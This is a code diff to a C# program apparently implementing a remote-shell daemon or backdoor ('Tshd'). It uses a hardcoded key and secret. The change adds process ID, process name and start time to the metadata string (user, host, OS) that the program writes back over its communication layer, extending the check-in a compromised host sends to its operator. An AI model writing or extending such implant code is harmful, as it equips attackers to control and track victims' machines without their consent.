@@ -20,9 +20,11 @@ namespace Tshd
             0x58, 0x90, 0xAE, 0x86, 0xF1, 0xB9, 0x1C, 0xF6,
             0x29, 0x83, 0x95, 0x71, 0x1D, 0xDE, 0x58, 0x0D,
         };
+        static DateTime StartTime;
 
         static void Main(string[] args)
         {
+            StartTime = DateTime.UtcNow;
             for (int i = 0; i < args.Length; i++)
             {
                 if (args[i] == "-s" && i + 1 < args.Length) Secret = args[i + 1];
@@ -103,7 +105,10 @@ namespace Tshd
                 string user = Environment.UserName;
                 string host = Dns.GetHostName();
                 string os = "Windows " + Environment.OSVersion.Version.ToString();
-                string meta = string.Format("{0}@{1}|{2}", user, host, os);
+                int pid = Process.GetCurrentProcess().Id;
+                string proc = Process.GetCurrentProcess().ProcessName;
+                long unixTime = (long)(StartTime.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
+                string meta = string.Format("{0}@{1}|{2}|{3}|{4}|{5}", user, host, os, pid, proc, unixTime);
                 byte[] data = Encoding.UTF8.GetBytes(meta);
                 layer.Write(data, 0, data.Length);
             }
